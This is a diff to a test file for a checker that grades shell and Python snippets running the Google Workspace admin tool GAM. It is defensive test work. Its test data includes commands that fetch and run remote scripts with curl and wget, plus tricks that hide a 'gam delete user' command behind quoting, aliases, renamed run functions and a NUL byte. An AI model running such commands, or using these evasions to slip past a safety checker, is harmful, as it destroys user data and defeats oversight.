@@ -637,6 +637,10 @@ AUDIT_2026_11 += [
     ('gam info domain\nbash < <(/usr/bin/curl -s https://example.com/x.sh)', 'shell', g.SUSPICIOUS, 'floor'),
     ('gam info domain\npython3 -c "$(wget -qO- https://example.com/x.py)"', 'shell', g.SUSPICIOUS, 'floor'),
     ('gam print users | grep bash', 'shell', g.READ, 'exact'),
+    # <<EOF inside quotes starts no heredoc; an indented alias still counts
+    ('gam info domain\necho "<<EOF"\nx=\'a # b\'; gam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
+    ('gam info domain\nmsg="start\nsee <<EOF\nx=\'a # b\'"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
+    ('gam info domain\nif true; then\n  alias zap="gam delete"\nfi\nzap user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
     # Python run functions reached by another name, and every os.exec/spawn form
     ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nrun = subprocess.run\nrun(["gam", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
     ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nrun = functools.partial(subprocess.run, check=True)\nrun(["gam", "delete", "user", "b@example.com"])',
@@ -669,6 +673,11 @@ def test_audit_2026_11(checker):
                                          '  gam delete user bob@example.com\nfi\nMODE=$1\n')
         (Path(d) / 'rb.sh').write_text('MODE="${1:-check}"\ncase "$MODE" in\n  check) gam print users ;;\n'
                                        '  go) gam delete user bob@example.com ;;\nesac\n')
+        # a NUL after the first line does not make a script a program file (bash still runs it)
+        (Path(d) / 'nul.sh').write_bytes(b'gam info domain\n# x\n\0\ngam delete user bob@example.com\n')
+        got = g.verdict(checker.check_text('bash nul.sh\n', '<t>', 'shell', [Path(d)]))
+        if got != g.DESTRUCTIVE:
+            failures.append(f'bash nul.sh: got {g.LEVEL_NAMES[got]}')
         for text, want in (('bash late.sh check', g.DESTRUCTIVE), ('xargs bash rb.sh < modes.txt', g.DESTRUCTIVE),
                            ('bash rb.sh check', g.READ)):
             got = g.verdict(checker.check_text(f'gam info domain\n{text}\n', '<t>', 'shell', [Path(d)]))
